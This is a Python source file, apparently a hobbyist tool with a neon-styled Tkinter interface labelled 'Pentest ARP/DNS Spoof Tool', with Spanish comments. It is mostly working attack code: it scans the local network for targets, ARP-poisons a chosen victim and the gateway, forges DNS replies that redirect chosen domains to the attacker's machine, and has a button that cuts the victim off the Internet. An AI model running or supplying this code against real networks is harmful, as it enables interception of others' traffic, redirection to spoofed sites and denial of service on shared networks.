import tkinter as tk
from tkinter import ttk, scrolledtext
from scapy.all import *
import threading
import time

# Global variables
spoofing = False
dns_spoofing = False
log_lock = threading.Lock()
gateway_ip = conf.route.route("0.0.0.0")[2]

# Fuente personalizada
PRESS_START_FONT = ("Press Start 2P", 8)
PRESS_START_FONT_BOLD = ("Press Start 2P", 8, "bold")
PRESS_START_FONT_STATUS = ("Press Start 2P", 10, "bold")

# Colores estilo neon/cyberpunk
BG_COLOR = "#121212"
NEON_GREEN = "#39FF14"
NEON_PINK = "#FF4EF5"
NEON_CYAN = "#00FFE7"
NEON_ORANGE = "#FF7F11"
NEON_RED = "#FF2E2E"
NEON_PURPLE = "#9B30FF"
TEXT_COLOR = NEON_CYAN

# UI Functions
def log(message):
    with log_lock:
        # Insertar con doble salto de línea para más espacio vertical
        log_box.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {message}\n\n")
        log_box.see(tk.END)

# Network Functions
def get_mac(ip):
    ans, _ = sr(ARP(pdst=ip), timeout=2, verbose=0)
    for s, r in ans:
        return r[ARP].hwsrc
    return None

def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        log(f"[!] No se pudo obtener la MAC de {target_ip}")
        return

    pkt = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(pkt, verbose=0, iface=conf.iface)

def restore_arp(target_ip, source_ip):
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    send(pkt, count=5, verbose=0)

def start_arp_spoof():
    global spoofing, dns_spoofing
    spoofing = True
    dns_spoofing = True
    log("[*] Iniciando ARP Spoofing + DNS Spoofing...")

    victim = victim_ip_entry.get().strip()
    if not victim:
        log("[!] No se ha especificado la IP de la víctima.")
        return

    domains = [d.strip().lower() for d in domains_entry.get().split(",") if d.strip()]
    if not domains:
        log("[!] No se han especificado dominios a spoofear.")
        return

    def spoof_loop():
        while spoofing:
            arp_spoof(victim, gateway_ip)
            arp_spoof(gateway_ip, victim)
            time.sleep(2)

    threading.Thread(target=spoof_loop, daemon=True).start()

    attacker_ip = get_if_addr(conf.iface)

    def process_dns(pkt):
        if pkt.haslayer(DNSQR) and pkt.haslayer(IP) and pkt.haslayer(UDP):
            queried_domain = pkt[DNSQR].qname.decode().strip('.').lower()
            source_ip = pkt[IP].src

            if source_ip == victim and any(domain in queried_domain for domain in domains):
                victim_mac = get_mac(source_ip)
                if not victim_mac:
                    log(f"[!] No se pudo obtener la MAC de la víctima ({source_ip}) para DNS spoof.")
                    return

                log(f"[+] Spoofing DNS para {queried_domain} → {attacker_ip}")

                spoofed_response = Ether(dst=victim_mac)/IP(dst=source_ip, src=pkt[IP].dst)/ \
                    UDP(dport=pkt[UDP].sport, sport=53)/ \
                    DNS(
                        id=pkt[DNS].id,
                        qr=1,
                        aa=1,
                        qd=pkt[DNS].qd,
                        an=DNSRR(rrname=pkt[DNSQR].qname, ttl=300, rdata=attacker_ip)
                    )

                sendp(spoofed_response, iface=conf.iface, verbose=0)

    def dns_sniffer():
        sniff(filter=f"udp port 53 and src host {victim}", prn=process_dns, store=0)

    threading.Thread(target=dns_sniffer, daemon=True).start()
    status_var.set("SPOOFING ACTIVO █")
    status_label.config(fg="lime")

def stop_spoofing():
    global spoofing, dns_spoofing
    spoofing = False
    dns_spoofing = False
    restore_arp(victim_ip_entry.get(), gateway_ip)
    restore_arp(gateway_ip, victim_ip_entry.get())
    log("[*] Ataques detenidos y ARP restaurado.")
    status_var.set("INACTIVO █")
    status_label.config(fg="red")

def scan_network():
    log("[*] Escaneando red con ARP Broadcast...")
    hosts_tree.delete(*hosts_tree.get_children())
    attacker_ip = get_if_addr(conf.iface)
    subnet = gateway_ip + "/24"
    try:
        answered, _ = arping(subnet, timeout=2, verbose=0)
        for sent, received in answered:
            ip = received.psrc
            mac = received.hwsrc
            ip_display = f"{ip} (HOST)" if ip == attacker_ip else ip
            hosts_tree.insert('', 'end', values=(ip_display, mac))
            log(f"[+] Host detectado: {ip_display} - {mac}")
        log("[*] Escaneo completado.")
    except Exception as e:
        log(f"[!] Error en escaneo: {e}")

def handle_host_selection(event):
    selected = hosts_tree.selection()
    if selected:
        item = hosts_tree.item(selected[0])
        ip = item['values'][0]
        victim_ip_entry.delete(0, tk.END)
        victim_ip_entry.insert(0, ip.split()[0])

def leave_without_internet():
    global spoofing
    spoofing = True
    log("[*] Envenenando ARP para dejar sin Internet a la víctima...")

    victim_ip = victim_ip_entry.get().strip()
    if not victim_ip:
        log("[!] No se ha seleccionado IP de víctima.")
        return

    gateway = conf.route.route("0.0.0.0")[2]
    attacker_mac = get_if_hwaddr(conf.iface)

    victim_mac = None
    for child in hosts_tree.get_children():
        ip_value = hosts_tree.item(child, 'values')[0]
        mac_value = hosts_tree.item(child, 'values')[1]
        if victim_ip in ip_value:
            victim_mac = mac_value
            break

    if not victim_mac:
        log("[!] No se encontró la MAC asociada a la IP víctima.")
        return

    def attack_loop():
        while spoofing:
            pkt = Ether(dst=victim_mac) / ARP(op=2, psrc=gateway, pdst=victim_ip, hwdst=victim_mac, hwsrc=attacker_mac)
            sendp(pkt, verbose=0, iface=conf.iface)
            log(f"[+] ARP enviado: {gateway} → {attacker_mac} (para {victim_ip})")
            time.sleep(2)

    threading.Thread(target=attack_loop, daemon=True).start()
    status_var.set("INTERNET BLOQUEADO █")
    status_label.config(fg="orange")

# --- Título animado en Label ---
def animate_label_text(label, text, delay=100):
    def anim(i=0):
        if i <= len(text):
            label.config(text=text[:i])
            label.after(delay, anim, i+1)
    anim()

# --- GUI Setup ---
app = tk.Tk()
app.configure(bg=BG_COLOR)
app.geometry("1024x700")
app.title("Pentest ARP/DNS Spoof Tool")

# Título como Label animado encima del frame Config
title_label = tk.Label(app, text="", fg=NEON_PINK, bg=BG_COLOR, font=("Press Start 2P", 18, "bold"))
title_label.pack(pady=(15,5))
animate_label_text(title_label, "Pentest ARP/DNS Spoof Tool", delay=80)

style = ttk.Style()
style.theme_use("clam")
style.configure("Treeview",
                background=BG_COLOR,
                foreground=NEON_GREEN,
                fieldbackground=BG_COLOR,
                font=PRESS_START_FONT)
style.configure("Treeview.Heading",
                background=BG_COLOR,
                foreground=NEON_ORANGE,
                font=PRESS_START_FONT_BOLD)
style.map("Treeview",
          background=[('selected', NEON_PURPLE)],
          foreground=[('selected', 'black')])

# Marco Configuración con color de borde neon
frame_config = tk.LabelFrame(app, text="Config", fg=NEON_ORANGE, bg=BG_COLOR,
                             font=PRESS_START_FONT_BOLD, labelanchor="n", padx=15, pady=10,
                             highlightthickness=2, highlightbackground=NEON_ORANGE)
frame_config.pack(pady=10, padx=15, fill="x")

tk.Label(frame_config, text="IP de la víctima:", fg=NEON_CYAN, bg=BG_COLOR, font=PRESS_START_FONT).grid(row=0, column=0, sticky="w", pady=6)
victim_ip_entry = tk.Entry(frame_config, width=20, bg=BG_COLOR, fg=NEON_GREEN, insertbackground=NEON_GREEN, font=PRESS_START_FONT)
victim_ip_entry.grid(row=0, column=1, padx=(5, 30), pady=6)

tk.Label(frame_config, text="Dominios a Spoofear:", fg=NEON_CYAN, bg=BG_COLOR, font=PRESS_START_FONT).grid(row=1, column=0, sticky="w", pady=6)
domains_entry = tk.Entry(frame_config, width=40, bg=BG_COLOR, fg=NEON_GREEN, insertbackground=NEON_GREEN, font=PRESS_START_FONT)
domains_entry.grid(row=1, column=1, padx=5, pady=6)

# Frame de botones
frame_buttons = tk.Frame(app, bg=BG_COLOR)
frame_buttons.pack(pady=10)

btn_iniciar = tk.Button(frame_buttons, text="▶ Iniciar Spoofing", command=lambda: threading.Thread(target=start_arp_spoof, daemon=True).start(),
                        bg=NEON_GREEN, fg=BG_COLOR, font=PRESS_START_FONT, activebackground="#2ECC40", activeforeground=BG_COLOR)
btn_iniciar.pack(side=tk.LEFT, padx=10, ipadx=5, ipady=5)

btn_leave = tk.Button(frame_buttons, text="🛑 Dejar sin internet", command=lambda: threading.Thread(target=leave_without_internet, daemon=True).start(),
                      bg=NEON_RED, fg=BG_COLOR, font=PRESS_START_FONT, activebackground="#FF4136", activeforeground=BG_COLOR)
btn_leave.pack(side=tk.LEFT, padx=10, ipadx=5, ipady=5)

btn_scan = tk.Button(frame_buttons, text="🌐 Escanear Red", command=lambda: threading.Thread(target=scan_network, daemon=True).start(),
                     bg=NEON_CYAN, fg=BG_COLOR, font=PRESS_START_FONT, activebackground="#00CED1", activeforeground=BG_COLOR)
btn_scan.pack(side=tk.LEFT, padx=10, ipadx=5, ipady=5)

btn_stop = tk.Button(frame_buttons, text="■ Detener", command=stop_spoofing,
                     bg=NEON_ORANGE, fg=BG_COLOR, font=PRESS_START_FONT, activebackground="#FF851B", activeforeground=BG_COLOR)
btn_stop.pack(side=tk.LEFT, padx=10, ipadx=5, ipady=5)

# Barra de estado
status_frame = tk.Frame(app, bg=BG_COLOR)
status_frame.pack(fill="x", padx=15, pady=(0,10))

status_var = tk.StringVar(value="INACTIVO █")
status_label = tk.Label(status_frame, textvariable=status_var, fg=NEON_RED, bg=BG_COLOR,
                        font=PRESS_START_FONT_STATUS, anchor="w")
status_label.pack(fill="x")

# Hosts Table
hosts_frame = tk.Frame(app, bg=BG_COLOR)
hosts_frame.pack(padx=15, pady=5, fill="both", expand=True)

hosts_tree = ttk.Treeview(hosts_frame, columns=("IP", "MAC"), show="headings", height=12)
hosts_tree.heading("IP", text="Dirección IP")
hosts_tree.heading("MAC", text="Dirección MAC")
hosts_tree.bind("<Double-1>", handle_host_selection)
hosts_tree.pack(side=tk.LEFT, fill="both", expand=True)

scroll_hosts = ttk.Scrollbar(hosts_frame, orient="vertical", command=hosts_tree.yview)
hosts_tree.configure(yscrollcommand=scroll_hosts.set)
scroll_hosts.pack(side=tk.RIGHT, fill="y")

# Log Box
log_frame = tk.Frame(app, bg=BG_COLOR)
log_frame.pack(padx=15, pady=10, fill="both", expand=True)

log_box = scrolledtext.ScrolledText(log_frame, bg=BG_COLOR, fg=NEON_GREEN, font=PRESS_START_FONT, height=10, insertbackground=NEON_GREEN, spacing3=6)
log_box.pack(fill="both", expand=True)

app.mainloop()
